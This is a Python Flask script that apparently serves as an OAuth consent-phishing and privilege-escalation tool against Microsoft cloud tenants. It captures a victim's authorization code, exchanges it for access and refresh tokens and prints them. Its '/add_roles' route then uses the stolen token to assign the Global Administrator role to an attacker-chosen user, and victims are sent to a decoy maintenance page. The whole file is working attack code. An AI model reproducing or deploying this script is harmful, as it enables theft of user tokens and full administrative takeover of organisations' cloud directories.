import flask
import adal
import threading,ssl,os,sys
import requests




token = None
refresh_token = None
app = flask.Flask(__name__)

client_id = "<app id>"
url = "https://login.microsoftonline.com/common/oauth2/authorize?response_type=code&client_id=" + client_id + "&scope=https://graph.microsoft.com/.default%20offline_access%20openid%20profile%20&redirect_uri=https://localhost/login/authorized&response_mode=query"
client_secret = "<app secret>"
RedirectAfterStealing = '/maintanance'
token = ""
userid = "<user id to be upgraded>"
roleid = "62e90394-69f5-4237-9190-012177145e10" # global administrator

def main(refresh_token, client_id, client_secret):
    pass  

@app.route('/login/authorized', methods=['GET', 'POST'])
def authorized():
    
    global token
    global refresh_token
    code = flask.request.args['code']
    auth_context = adal.AuthenticationContext('https://login.microsoftonline.com/common', api_version=None)
    response = auth_context.acquire_token_with_authorization_code( code, "https://localhost/login/authorized", 'https://graph.microsoft.com/', client_id, client_secret)
    refresh_token = response['refreshToken']
    access_token = response['accessToken']
    print()
    print("access token:")
    print(access_token)
    print()    
    token = "Bearer " + access_token
    print()  
    print()
    return flask.redirect(RedirectAfterStealing)


@app.route('/roles')
def roles():
    print()
    print("using token:")
    print(token)
    print("calling roles api call.")
    response = requests.get(" https://graph.microsoft.com/v1.0/directoryRoles", headers={"Authorization":token}) 
    print()
    print(response.json())
    print()
    return flask.redirect(RedirectAfterStealing)

@app.route('/add_roles')
def addroles():
    
    url = "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments"
    headers = {
        "Content-Type": "application/json",
        "Authorization": token
    }
    data = {
    "@odata.type": "#microsoft.graph.unifiedRoleAssignment",
    "roleDefinitionId": roleid,
    "principalId": userid,
    "directoryScopeId": "/"
    }

    response = requests.post(url, headers=headers, json=data)
    print()
    print("trying to add user to role:")
    print("Response:", response.text)
    print()
    return flask.redirect(RedirectAfterStealing)


@app.route('/maintanance')
def index():
   return flask.send_from_directory(".", path="maintanance.html") # just a random html  to be present to attacker

@app.route('/refresh')
def refresh():
   print("refreshing access token.")
   url = 'https://login.microsoftonline.com/common/oauth2/v2.0/token'
   global refresh_token,token    
   auth_context = adal.AuthenticationContext('https://login.microsoftonline.com/common', api_version=None)
   response = auth_context.acquire_token_with_refresh_token(refresh_token, client_id, 'https://graph.microsoft.com/', client_secret)
   refresh_token = response['refreshToken']
   access_token = response['accessToken']
   token = "Bearer " + access_token
   print()
   print("new access token:")
   print(access_token)
   print()
   return flask.redirect(RedirectAfterStealing)


if __name__ == "__main__":
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    cert = os.path.dirname(os.path.abspath(sys.argv[0])) + "/server.cert" # just create one with openssl
    key  = os.path.dirname(os.path.abspath(sys.argv[0])) + "/server.key"  # just create one with openssl
    context.load_cert_chain(cert, key)
    app.run(debug=True,port=443,use_reloader=False,  ssl_context=context)
